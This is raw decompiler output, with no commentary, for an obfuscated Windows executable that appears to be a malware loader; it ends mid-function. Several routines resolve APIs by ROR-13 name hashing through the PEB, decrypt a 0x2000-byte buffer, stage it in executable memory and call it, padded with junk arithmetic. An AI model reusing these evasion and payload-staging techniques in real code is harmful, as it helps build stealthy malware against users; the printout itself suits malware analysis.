// 40434F: variable 'v206' is possibly undefined
// 40434F: variable 'v205' is possibly undefined
// 404AEC: variable 'v219' is possibly undefined
// 404AEC: variable 'v218' is possibly undefined
// 4021D1: variable 'v60' is possibly undefined
// 4021E4: variable 'v61' is possibly undefined
// 4021EE: variable 'v63' is possibly undefined
// 4021EE: variable 'v62' is possibly undefined
// 402E6C: variable 'v232' is possibly undefined
// 402E7F: variable 'v115' is possibly undefined
// 402E8E: variable 'v117' is possibly undefined
// 402E8E: variable 'v116' is possibly undefined
// 402E97: variable 'v119' is possibly undefined
// 402E97: variable 'v118' is possibly undefined
// 402EAA: variable 'v122' is possibly undefined
// 402EAA: variable 'v121' is possibly undefined
// 401AA1: variable 'v38' is possibly undefined
// 401956: variable 'v30' is possibly undefined
// 401966: variable 'v32' is possibly undefined
// 401966: variable 'v31' is possibly undefined
// 405225: variable 'v226' is possibly undefined
// 4033B0: variable 'v146' is possibly undefined
// 4033B0: variable 'v145' is possibly undefined
// 403F80: variable 'v194' is possibly undefined
// 402980: variable 'v91' is possibly undefined
// 401B47: variable 'v46' is possibly undefined
// 401B55: variable 'v47' is possibly undefined
// 4038AA: variable 'v169' is possibly undefined
// 4038BC: variable 'v170' is possibly undefined
// 40232A: variable 'v67' is possibly undefined
// 401FB3: variable 'v124' is possibly undefined
// 405025: variable 'v224' is possibly undefined
// 402B67: variable 'v103' is possibly undefined
// 402B71: variable 'v104' is possibly undefined
// 402B71: variable 'v105' is possibly undefined
// 401825: variable 'v96' is possibly undefined
// 4013D2: variable 'v21' is possibly undefined
// 401AC3: variable 'v42' is possibly undefined
// 401AC3: variable 'v41' is possibly undefined
// 401ADE: variable 'v45' is possibly undefined
// 401ADE: variable 'v44' is possibly undefined
// 4020AF: variable 'v57' is possibly undefined
// 4020AF: variable 'v56' is possibly undefined
// 4020BF: variable 'v59' is possibly undefined
// 4020BF: variable 'v58' is possibly undefined
// 40444F: variable 'v209' is possibly undefined
// 40444F: variable 'v208' is possibly undefined
// 404385: variable 'v207' is possibly undefined
// 402637: variable 'v84' is possibly undefined
// 402637: variable 'v83' is possibly undefined
// 4024F9: variable 'v81' is possibly undefined
// 401872: variable 'v108' is possibly undefined
// 401A1E: variable 'v107' is possibly undefined
// 401AB2: variable 'v161' is possibly undefined
// 401E9F: variable 'v220' is possibly undefined
// 401E9F: variable 'v221' is possibly undefined
// 4039B7: variable 'v174' is possibly undefined
// 4039B7: variable 'v173' is possibly undefined
// 4039CC: variable 'v175' is possibly undefined
// 402571: variable 'v27' is possibly undefined
// 402A14: variable 'v97' is possibly undefined
// 402AB9: variable 'v102' is possibly undefined
// 402A2E: variable 'v68' is possibly undefined
// 402A2E: variable 'v69' is possibly undefined
// 403F23: variable 'v192' is possibly undefined
// 402480: variable 'v77' is possibly undefined
// 402480: variable 'v76' is possibly undefined
// 4032A2: variable 'v136' is possibly undefined
// 4033A0: variable 'v135' is possibly undefined
// 40347A: variable 'v152' is possibly undefined
// 4035AE: variable 'v155' is possibly undefined
// 4035AE: variable 'v154' is possibly undefined
// 402417: variable 'v71' is possibly undefined
// 403EF8: variable 'v191' is possibly undefined
// 401681: variable 'v25' is possibly undefined
// 401681: variable 'v24' is possibly undefined
// 4035FA: variable 'v158' is possibly undefined
// 40360D: variable 'v160' is possibly undefined
// 401ED3: variable 'v28' is possibly undefined
// 404ACC: variable 'v18' is possibly undefined
// 405155: variable 'v225' is possibly undefined
// 4015CB: variable 'v23' is possibly undefined
// 4015CB: variable 'v22' is possibly undefined
// 4041EE: variable 'v201' is possibly undefined
// 4041FF: variable 'v202' is possibly undefined
// 4035E3: variable 'v156' is possibly undefined
// 402711: variable 'v85' is possibly undefined
// 40271C: variable 'v87' is possibly undefined
// 40271C: variable 'v86' is possibly undefined
// 4019E8: variable 'v34' is possibly undefined
// 4019E8: variable 'v33' is possibly undefined
// 4019F2: variable 'v36' is possibly undefined
// 4019F2: variable 'v35' is possibly undefined
// 403AFB: variable 'v186' is possibly undefined
// 403728: variable 'v166' is possibly undefined
// 403728: variable 'v165' is possibly undefined
// 401064: variable 'v5' is possibly undefined
// 401064: variable 'v4' is possibly undefined
// 403A25: variable 'v181' is possibly undefined
// 4046AF: variable 'v213' is possibly undefined
// 403A0A: variable 'v179' is possibly undefined
// 403A0A: variable 'v178' is possibly undefined
// 403915: variable 'v172' is possibly undefined
// 402872: variable 'v89' is possibly undefined
// 4031A0: variable 'v133' is possibly undefined
// 4052A3: variable 'v74' is possibly undefined
// 4052A3: variable 'v73' is possibly undefined

//----- (0040300C) --------------------------------------------------------
int __userpurge sub_40300C@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5)
{
  return a1 + 11844;
}

//----- (00403247) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_403247(unsigned int a1@<edx>, unsigned int a2@<ecx>, int a3@<ebp>, int a4@<esi>)
{
  int v4; // eax
  unsigned int v5; // eax
  unsigned int v6; // [esp-10h] [ebp-234h]

  LOWORD(v4) = 0;
  if ( (a2 & 0x2FF) != 0 )
  {
    v4 = (((*(unsigned __int8 *)(a3 - 392) ^ 0x22D6) + 13385) & 0xED8) + 15802;
    if ( (v4 & 0x334) != 0 )
    {
LABEL_8:
      v5 = ((_WORD)v4 + 3500 + __CFADD__(v4, 3500) + (_WORD)v4 + 3500 + 10108) & 0x2021;
      if ( v5 >= a1 )
      {
        v5 += 6551;
        if ( a1 > a2 )
        {
LABEL_2:
          sub_402272(-1428888048, a1, 0);
          sub_4061E7(dword_43AADC, a4);
          dword_439048 = v6 >> 6;
          LOBYTE(dword_439028) = 70;
          __asm { retn }
        }
        LOWORD(v5) = (((v5 | 0x1B63) ^ 0x2B52) < 0x1E92) + ((v5 | 0x1B63) ^ 0x2B52) - 7826 + 14718;
      }
      *(_DWORD *)(a3 - 400) += v5 & 0x157D;
      goto LABEL_2;
    }
    *(_DWORD *)(a3 - 104) -= (((*(unsigned __int8 *)(a3 - 392) ^ 0x22D6) + 13385) & 0xED8) + 15802;
  }
  v4 = (2 * (_WORD)v4) & 0x1720;
  goto LABEL_8;
}
// 4079C6: positive sp value 23C has been found
// 4079B8: variable 'v6' is possibly undefined
// 439028: using guessed type int dword_439028;
// 439048: using guessed type int dword_439048;
// 43AAD8: using guessed type int dword_43AAD8;
// 43AADC: using guessed type int dword_43AADC;
// 43AC43: using guessed type int dword_43AC43;

//----- (00403BE5) --------------------------------------------------------
int __userpurge sub_403BE5@<eax>(int a1@<eax>, int a2, int a3)
{
  int v3; // ecx
  int v4; // edx
  int v5; // edx
  int v6; // ecx
  int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // eax
  char v10; // cf
  int v12; // ecx
  int v13; // eax
  int v14; // eax
  int v15; // edx
  unsigned int v16; // ecx
  int v17; // eax
  __int16 v18; // ax
  int v19; // eax
  int v20; // edx
  int v21; // eax
  int v22; // edx
  int v23; // ecx
  int v24; // eax
  int v25; // eax
  int v26; // edx
  int v27; // ecx
  int v28; // [esp-16Ch] [ebp-170h] BYREF
  int v29; // [esp-168h] [ebp-16Ch]
  int v30; // [esp-128h] [ebp-12Ch]
  int v31; // [esp-124h] [ebp-128h]
  int v32; // [esp-118h] [ebp-11Ch]
  int v33; // [esp-DCh] [ebp-E0h]
  int v34; // [esp-D4h] [ebp-D8h]
  int v35; // [esp-C0h] [ebp-C4h]
  int v36; // [esp-BCh] [ebp-C0h]
  int v37; // [esp-B8h] [ebp-BCh] BYREF
  int v38; // [esp-94h] [ebp-98h]
  int v39; // [esp-70h] [ebp-74h]
  _DWORD v40[28]; // [esp-6Ch] [ebp-70h] BYREF

  v18 = sub_401545(a1, (int)&v28, (int)&v28, (int)&v37);
  v19 = sub_40300C(v18 & 0x25BD, 0, (int)v40, (int)v40, 0);
  v21 = sub_401779(v19 - 2544, v20);
  v35 -= v40[1] & v21;
  v24 = sub_402B35(v23, v22);
  v36 &= v24;
  v25 = sub_402272(v33, 1047669997, 0);
  sub_403D10(v27, v26, 0, 40, v25 - 12628);
  sub_401BE4(v3, 0, -1936770953);
  sub_401BE4(0, 0, v4);
  sub_402272(v39, v12, 0);
  v7 = sub_401BE4(v6, 0, v5);
  v29 &= v7;
  v8 = sub_401BE4(v7, 0, 699458848);
  v38 |= v8;
  v9 = sub_401BE4(0, 0, 1468782767);
  v30 += v9 + v10;
  v13 = sub_402272(2113814481, 0, 0);
  v14 = sub_402272(v32, v13, 0);
  v34 &= v14;
  v17 = __CFADD__(v14 & 0x24A4, 10605) + (v14 & 0x24A4) + 10605 + 16056;
  if ( v16 <= v40[12] && (v15 & 0x1E3D) == 0 && !v15 )
    v31 &= v17;
  sub_401779(v16, v15);
  return sub_401A03(26) - 11375;
}
// 404F8D: variable 'v20' is possibly undefined
// 404F9B: variable 'v23' is possibly undefined
// 404F9B: variable 'v22' is possibly undefined
// 404FC8: variable 'v27' is possibly undefined
// 404FC8: variable 'v26' is possibly undefined
// 401348: variable 'v3' is possibly undefined
// 401361: variable 'v4' is possibly undefined
// 403773: variable 'v12' is possibly undefined
// 402195: variable 'v6' is possibly undefined
// 402195: variable 'v5' is possibly undefined
// 40342B: variable 'v10' is possibly undefined
// 4032D5: variable 'v15' is possibly undefined
// 40353E: variable 'v16' is possibly undefined

//----- (00403D10) --------------------------------------------------------
int __fastcall sub_403D10(int a1, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  char v7[28]; // [esp+58h] [ebp-1A8h] BYREF
  int v8; // [esp+74h] [ebp-18Ch]
  int v9; // [esp+120h] [ebp-E0h]
  unsigned __int16 v10; // [esp+1D4h] [ebp-2Ch]

  v6 = (((v10 + 93) | 0x14CB) ^ 0x30CD) + 9165;
  if ( a1 >= 0 )
  {
    v6 = v6 + 10774 - ((((unsigned int)v6 | 0x168500000000ui64) + 10774) >> 32);
    if ( (a2 & v8) == 0 )
      v6 = (v6 & 0x1E85) + 13070;
  }
  return sub_40300C(v6, v6, v9, (int)v7, 0);
}

//----- (00404030) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_404030(unsigned int a1@<edx>, unsigned int a2@<ecx>, int a3@<esi>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_403247(a1, a2, (int)&savedregs, a3);
}
// 404033: bad sp value at call

//----- (004056EC) --------------------------------------------------------
int sub_4056EC()
{
  int v0; // ecx
  int v1; // ebx
  _DWORD *v3; // edx
  int v4; // edi
  unsigned __int8 *v5; // esi
  int v6; // eax

  v3 = (_DWORD *)*((_DWORD *)NtCurrentPeb()->ImageBaseAddress + 5);
  dword_43902C = dword_439914 + 1;
  do
  {
    dword_439020 = 6270;
    dword_43902C += 20658;
    v5 = (unsigned __int8 *)v3[10];
    dword_43901C += 22009;
    LOBYTE(dword_439030) = -104;
    v0 = 24;
    v4 = 0;
    do
    {
      LOBYTE(dword_439034) = 35;
      v6 = *v5++;
      LOBYTE(dword_439038) = -105;
      if ( (char)v6 >= 97 )
      {
        LOBYTE(v6) = v6 - 32;
        LOBYTE(dword_439008) = 90;
      }
      LOBYTE(dword_439020) = -90;
      v4 = v6 + __ROR4__(v4, 13);
      --v0;
    }
    while ( v0 );
    v1 = v3[4];
    v3 = (_DWORD *)*v3;
    dword_439034 = (int)&v5[dword_43900C + 9441 + dword_439C40];
  }
  while ( v4 != 1783282779 );
  LOBYTE(dword_43904C) = dword_43904C - 67;
  return v1;
}
// 439008: using guessed type int dword_439008;
// 43900C: using guessed type int dword_43900C;
// 43901C: using guessed type int dword_43901C;
// 439020: using guessed type int dword_439020;
// 43902C: using guessed type int dword_43902C;
// 439030: using guessed type int dword_439030;
// 439034: using guessed type int dword_439034;
// 439038: using guessed type int dword_439038;
// 43904C: using guessed type int dword_43904C;
// 439914: using guessed type int dword_439914;
// 439C40: using guessed type int dword_439C40;

//----- (00405720) --------------------------------------------------------
int __cdecl sub_405720(int a1)
{
  unsigned int i; // esi
  int v3; // ebx
  _DWORD *v4; // edi
  unsigned __int16 *v5; // [esp+10h] [ebp-Ch]
  _DWORD *v6; // [esp+14h] [ebp-8h]
  int v7; // [esp+18h] [ebp-4h]

  v3 = sub_4056EC();
  v4 = (_DWORD *)(v3 + *(_DWORD *)(v3 + *(_DWORD *)(v3 + 60) + 120));
  if ( HIWORD(a1) )
  {
    v6 = (_DWORD *)(v3 + v4[8]);
    v5 = (unsigned __int16 *)(v3 + v4[9]);
    for ( i = 0; v4[6] > i; ++i )
    {
      if ( ((int (__cdecl *)(int))((char *)&loc_40685F + 1))(v3 + *v6) == a1 )
      {
        v7 = *v5;
        break;
      }
      ++v6;
      ++v5;
    }
    if ( v4[6] == i )
      return 0;
  }
  else
  {
    v7 = (unsigned __int16)a1 - v4[4];
  }
  return v3 + *(_DWORD *)(v3 + v4[7] + 4 * v7);
}
// 4059C8: variable 'v7' is possibly undefined

//----- (00405E59) --------------------------------------------------------
int (__fastcall *__usercall sub_405E59@<eax>(unsigned int a1@<edx>, int a2@<ebx>))(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD)
{
  _BYTE *v2; // edi
  int v3; // ecx
  _BYTE *v4; // esi
  int v5; // edx
  int v6; // edi
  int v7; // eax
  int v8; // ebx
  int (__fastcall *result)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v10; // edx
  int v11; // ecx
  int v12; // ebx
  int v13; // ebx
  int v14; // ecx
  _BYTE *v15; // edi
  int v16; // ebx
  _BYTE *v17; // edi
  bool v18; // cf
  int v19; // ebx
  int v20; // ett
  int v21; // ecx
  int v22; // esi
  int v23; // eax
  int v24; // ecx
  int v25; // esi
  int v26; // ebx
  int v27; // ebx
  int v28; // ecx
  int v29; // ecx
  int v30; // edx
  char v31; // al
  char v32; // cl
  int v33; // ebx
  PVOID (__stdcall **v34)(PSID); // ebx
  int v35; // eax
  char v36; // ch
  int v37; // ecx
  int v38; // edx
  int v39; // ecx
  char *v40; // esi
  char v41; // cf
  char v42; // dh
  int v43; // edx
  int v44; // edx
  int v45; // edx
  int v46; // eax
  int v47; // ecx
  int v48; // [esp-8h] [ebp-8h]
  int v49; // [esp-4h] [ebp-4h]
  char v50; // [esp-3h] [ebp-3h]

  BYTE1(a2) += (a1 < dword_4394A8) + 70;
  v14 = 0x2000;
  v16 = a2 - dword_43A988;
  BYTE1(v16) = -96;
  v15 = &unk_4209EB;
  LOBYTE(v16) = byte_43AB00 + v16;
  do
  {
    v12 = v16 - dword_439B80 - dword_43A2D8;
    v49 = v14;
    *v15 = sub_406516((__int16)v15);
    ++v15;
    LOBYTE(dword_439028) = dword_439028 - 104;
    v16 = v18 + v12 + 36676;
    v14 = v49 - 1;
  }
  while ( v49 != 1 );
  dword_439048 = 5820;
  dword_439040 = 9774;
  dword_43AC53(dword_4396E8, 5820, 255, &unk_4208EB);
  LOBYTE(dword_439010) = dword_439010 + 36;
  v29 = v28 - ((((unsigned int)dword_439AA8 | 0x4AC200000000ui64) + 19436) >> 32);
  dword_439020 -= v29;
  LOBYTE(v29) = byte_43961C + v29;
  dword_43AC27(
    ((unsigned int)dword_439270 > 0x6912) + v29 + 19074,
    dword_43965C + 19956,
    &unk_4208EB,
    &unk_43AC67,
    0,
    &byte_43AB00);
  dword_439004 -= v38;
  dword_43901C = (int)&v15[*(_DWORD *)((char *)&loc_43A515 + 3)
                         + 8057
                         + __CFADD__(*(_DWORD *)((char *)&loc_43A515 + 3), v15)];
  v18 = __CFADD__((_BYTE)dword_439030, 89);
  LOBYTE(dword_439030) = dword_439030 + 89;
  dword_439044 = v18 + dword_4397A8 + 13299;
  LOBYTE(dword_43903C) = -24;
  v35 = dword_43AAE0(v38, &byte_43AB00, -1073741824, 1, 0, 2, 32, 0);
  BYTE1(v37) = v35 + v18 + v36;
  dword_43903C -= 6766;
  dword_439014 -= v37;
  LOBYTE(v44) = v44 ^ 0xC9;
  dword_439048 += 30537;
  BYTE1(v37) = (unsigned __int16)&RegEnumValueA >> 8;
  dword_43AC89(v37, dword_43A238 + v44 - dword_43A1B8, v35, &unk_4209EB, 0x2000, &dword_43AC63, 0, v35);
  ((void (*)(void))dword_43AC1B)();
  dword_439020 += 15156;
  dword_439018 += 35291;
  v3 = 0x2000;
  dword_439010 += (int)&RegEnumValueA;
  v2 = &unk_4209EB;
  do
  {
    v48 = v3;
    v33 = dword_43913C;
    v31 = sub_406516((__int16)v2);
    dword_439010 = v33;
    *v2++ = v31;
    BYTE1(v33) = v32;
    dword_43903C = v33;
    v3 = v48 - 1;
  }
  while ( v48 != 1 );
  LOBYTE(dword_43902C) = dword_43902C + 102;
  BYTE1(v33) += byte_439F68;
  dword_439024 = v33;
  v34 = &FreeSid;
  LOBYTE(dword_439010) = -103;
  LOBYTE(dword_43904C) = -59;
  result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405720(1769630462);
  BYTE1(v34) = byte_43A2FC + ((unsigned __int16)&FreeSid >> 8);
  dword_43903C -= (int)v34;
  if ( result )
  {
    dword_43AC63 = result;
    result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405720(976580703);
    LOBYTE(dword_43902C) = dword_43902C + 107;
    if ( result )
    {
      dword_43902C = 20945;
      dword_43AC4B = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
      v40 = (char *)&CreateFileA - dword_43A678;
      dword_439040 -= 2316;
      v8 = ((v41 + 17024) ^ 0x1928) - 3935;
      result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dword_43AC63(
                                                                                     v50,
                                                                                     13507,
                                                                                     0,
                                                                                     0x2000,
                                                                                     12288,
                                                                                     64);
      dword_439010 = (int)v40;
      if ( result )
      {
        dword_439044 = v10;
        dword_43AAEC = (int)result;
        v27 = v8 - (((unsigned __int8)v11 < 0x76u) + 16681);
        v18 = __CFADD__((_BYTE)dword_439024, -38);
        LOBYTE(dword_439024) = -62;
        LOBYTE(v11) = (_BYTE)result;
        BYTE1(v11) = byte_43AAF0;
        v13 = v18 + v27 + 11617;
        dword_439008 += 27074;
        LOBYTE(dword_439038) = 123;
        v22 = dword_43A304 - (_DWORD)off_43AAA4;
        BYTE1(v13) += byte_439F8C;
        v23 = dword_43AAE0(v11, &byte_43AB00, -1073741824, 1, 0, 3, 0, 0);
        LOBYTE(v24) = byte_4393D4;
        LOBYTE(dword_43901C) = -53;
        v25 = v22 - (v18 + *(_DWORD *)((char *)&loc_43A6DE + 2));
        v26 = v13 - dword_43A3E4;
        v18 = __CFADD__(v25, dword_43903C);
        dword_43903C += v25;
        LOBYTE(dword_439028) = dword_439028 - 85;
        dword_43AAE4(
          136,
          dword_4392F0 - ((__CFADD__(v18, v24) | __CFADD__(v18 + v24, 4576)) + 136),
          v23,
          dword_43AAEC,
          0x2000,
          &unk_4208EB,
          0,
          v23);
        dword_43AC1B(v39, v39 + v30);
        dword_439008 -= 10334;
        BYTE1(v45) = byte_43A298;
        v46 = dword_43AC81(&FreeSid, v45, &byte_43AB00);
        v47 = 0x2000;
        LOBYTE(dword_439040) = 95;
        LOBYTE(dword_439004) = dword_439004 - 39;
        v4 = (_BYTE *)dword_43AAEC;
        dword_43902C -= v26 - v46;
        v5 = 0;
        v7 = 0;
        do
        {
          LOBYTE(v7) = *v4++;
          v5 += v7;
          v6 = v7 + 29022;
          v7 = 0;
          dword_439028 = 7079;
          dword_439030 += v6;
          --v47;
        }
        while ( v47 );
        dword_439040 = 32374;
        dword_43AAE8 = v5;
        LOBYTE(dword_43904C) = dword_43904C - 50;
        dword_43AC4B(dword_43A878, 28125, dword_43AAEC, 0, 0x8000);
        result = 0;
        BYTE1(v43) = byte_43A854 + v42;
        v21 = 0x2000;
        v17 = &unk_4209EB;
        dword_439028 = v43 - 31315;
        v18 = __CFADD__(byte_43A4B0, BYTE1(v43));
        v19 = dword_43A404;
        do
        {
          *v17++ = 0;
          v20 = v18;
          v18 = __CFADD__(v18, v19);
          v19 += v20;
          v18 |= __CFADD__(v21, v19);
          v19 += v21--;
        }
        while ( v21 );
      }
    }
  }
  return result;
}
// 406A7D: conditional instruction was optimized away because of '%0x18.4==1'
// 4074E8: variable 'v41' is possibly undefined
// 40746B: variable 'v50' is possibly undefined
// 40620C: variable 'v10' is possibly undefined
// 405BE1: variable 'v11' is possibly undefined
// 405FA2: variable 'v18' is possibly undefined
// 406094: variable 'v24' is possibly undefined
// 407273: variable 'v39' is possibly undefined
// 406725: variable 'v30' is possibly undefined
// 407E0A: variable 'v45' is possibly undefined
// 40643B: variable 'v28' is possibly undefined
// 407108: variable 'v38' is possibly undefined
// 406F77: variable 'v36' is possibly undefined
// 407CA4: variable 'v37' is possibly undefined
// 407CAA: variable 'v44' is possibly undefined
// 406A51: variable 'v32' is possibly undefined
// 407787: variable 'v42' is possibly undefined
// 4076BF: variable 'v43' is possibly undefined
// 439004: using guessed type int dword_439004;
// 439008: using guessed type int dword_439008;
// 439010: using guessed type int dword_439010;
// 439014: using guessed type int dword_439014;
// 439018: using guessed type int dword_439018;
// 43901C: using guessed type int dword_43901C;
// 439020: using guessed type int dword_439020;
// 439024: using guessed type int dword_439024;
// 439028: using guessed type int dword_439028;
// 43902C: using guessed type int dword_43902C;
// 439030: using guessed type int dword_439030;
// 439038: using guessed type int dword_439038;
// 43903C: using guessed type int dword_43903C;
// 439040: using guessed type int dword_439040;
// 439044: using guessed type int dword_439044;
// 439048: using guessed type int dword_439048;
// 43904C: using guessed type int dword_43904C;
// 43913C: using guessed type int dword_43913C;
// 439270: using guessed type int dword_439270;
// 4392F0: using guessed type int dword_4392F0;
// 4393D4: using guessed type char byte_4393D4;
// 4394A8: using guessed type int dword_4394A8;
// 43961C: using guessed type char byte_43961C;
// 43965C: using guessed type int dword_43965C;
// 4396E8: using guessed type int dword_4396E8;
// 4397A8: using guessed type int dword_4397A8;
// 439AA8: using guessed type int dword_439AA8;
// 439B80: using guessed type int dword_439B80;
// 439F68: using guessed type char byte_439F68;
// 439F8C: using guessed type char byte_439F8C;
// 43A1B8: using guessed type int dword_43A1B8;
// 43A238: using guessed type int dword_43A238;
// 43A298: using guessed type char byte_43A298;
// 43A2D8: using guessed type int dword_43A2D8;
// 43A2FC: using guessed type char byte_43A2FC;
// 43A304: using guessed type int dword_43A304;
// 43A3E4: using guessed type int dword_43A3E4;
// 43A404: using guessed type int dword_43A404;
// 43A4B0: using guessed type char byte_43A4B0;
// 43A678: using guessed type int dword_43A678;
// 43A854: using guessed type char byte_43A854;
// 43A878: using guessed type int dword_43A878;
// 43A988: using guessed type int dword_43A988;
// 43AAA4: using guessed type int *off_43AAA4;
// 43AAE0: using guessed type int (__thiscall *dword_43AAE0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AAE4: using guessed type int (__fastcall *dword_43AAE4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AAE8: using guessed type int dword_43AAE8;
// 43AAEC: using guessed type int dword_43AAEC;
// 43AAF0: using guessed type char byte_43AAF0;
// 43AB00: using guessed type char byte_43AB00;
// 43AC1B: using guessed type int (__fastcall *dword_43AC1B)(_DWORD, _DWORD);
// 43AC27: using guessed type int (__fastcall *dword_43AC27)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AC4B: using guessed type int (__fastcall *dword_43AC4B)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AC53: using guessed type int (__fastcall *dword_43AC53)(_DWORD, _DWORD, _DWORD, _DWORD);
// 43AC63: using guessed type int (__fastcall *dword_43AC63)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AC81: using guessed type int (__fastcall *dword_43AC81)(_DWORD, _DWORD, _DWORD);
// 43AC89: using guessed type int (__fastcall *dword_43AC89)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00405E95) --------------------------------------------------------
void __usercall sub_405E95(unsigned int a1@<ecx>, int a2@<ebx>, void *a3@<edi>, const void *a4@<esi>)
{
  qmemcpy(a3, a4, a1);
  dword_439048 = dword_439894 + a2;
}
// 439048: using guessed type int dword_439048;
// 439894: using guessed type int dword_439894;

//----- (004061E7) --------------------------------------------------------
unsigned int __usercall sub_4061E7@<eax>(int a1@<edx>, int a2@<esi>)
{
  unsigned int result; // eax
  unsigned int retaddr; // [esp+0h] [ebp+0h]

  dword_439028 -= a2;
  dword_43AAD8 ^= a1 + 1542;
  result = retaddr & 0xFFFF0000;
  dword_43AC43 = retaddr & 0xFFFF0000;
  return result;
}
// 439028: using guessed type int dword_439028;
// 43AAD8: using guessed type int dword_43AAD8;
// 43AC43: using guessed type int dword_43AC43;

//----- (004062CA) --------------------------------------------------------
int (__fastcall *sub_4062CA())(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD)
{
  int v0; // edx
  char v1; // cf
  int v2; // edx
  int v3; // esi
  int (__fastcall *result)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v5; // [esp-4h] [ebp-4h]
  unsigned int v6; // [esp-4h] [ebp-4h]
  int v7; // [esp-4h] [ebp-4h]

  dword_439008 += 8368;
  result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405720(262468866);
  if ( result )
  {
    dword_43AC27 = result;
    dword_439044 = 30899;
    LOBYTE(dword_439014) = dword_439014 + 16;
    result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405720(1493072574);
    if ( result )
    {
      dword_439018 += 29258;
      dword_43AC53 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD))result;
      dword_43902C += dword_439328;
      dword_43903C -= v7 - 29822;
      result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405720(150532372);
      dword_439040 += 35054;
      dword_439018 = 18754;
      v2 = v0 ^ 0x79AB;
      if ( result )
      {
        dword_43902C = v2;
        dword_43AAE0 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
        dword_439044 += (int)(&FreeSid + 7933);
        result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405720(1916711125);
        v3 = 35054 - dword_439038;
        if ( result )
        {
          dword_43AC1B = (int (__fastcall *)(_DWORD, _DWORD))result;
          dword_439024 += 20520;
          result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405720(-2114916129);
          dword_439014 += v3;
          if ( result )
          {
            dword_43AC81 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))result;
            dword_439018 = v5;
            dword_439014 = v3 - 11683;
            result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405720(1216340331);
            if ( result )
            {
              dword_43AAE4 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
              LOBYTE(dword_439048) = dword_439048 + 81;
              dword_439014 += 19729;
              dword_43901C = 6567;
              result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405720(255840707);
              if ( result )
              {
                dword_439044 = v6;
                dword_43AC89 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
                dword_439020 += v6;
                sub_405E59(v6, (int)result);
                LOBYTE(dword_439030) = 67;
                dword_439048 = 22353;
                dword_439030 -= 8108;
                dword_439024 -= v1 + 17674;
                __asm { retn }
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 406103: variable 'v0' is possibly undefined
// 4063A7: variable 'v5' is possibly undefined
// 406D0D: variable 'v7' is possibly undefined
// 407801: variable 'v6' is possibly undefined
// 4059B7: variable 'v1' is possibly undefined
// 439008: using guessed type int dword_439008;
// 439014: using guessed type int dword_439014;
// 439018: using guessed type int dword_439018;
// 43901C: using guessed type int dword_43901C;
// 439020: using guessed type int dword_439020;
// 439024: using guessed type int dword_439024;
// 43902C: using guessed type int dword_43902C;
// 439030: using guessed type int dword_439030;
// 439038: using guessed type int dword_439038;
// 43903C: using guessed type int dword_43903C;
// 439040: using guessed type int dword_439040;
// 439044: using guessed type int dword_439044;
// 439048: using guessed type int dword_439048;
// 439328: using guessed type int dword_439328;
// 43AAE0: using guessed type int (__thiscall *dword_43AAE0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AAE4: using guessed type int (__fastcall *dword_43AAE4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AAE8: using guessed type int dword_43AAE8;
// 43AC1B: using guessed type int (__fastcall *dword_43AC1B)(_DWORD, _DWORD);
// 43AC27: using guessed type int (__fastcall *dword_43AC27)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AC43: using guessed type int dword_43AC43;
// 43AC53: using guessed type int (__fastcall *dword_43AC53)(_DWORD, _DWORD, _DWORD, _DWORD);
// 43AC81: using guessed type int (__fastcall *dword_43AC81)(_DWORD, _DWORD, _DWORD);
// 43AC89: using guessed type int (__fastcall *dword_43AC89)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00406516) --------------------------------------------------------
int __usercall sub_406516@<eax>(__int16 a1@<di>)
{
  unsigned int v1; // eax

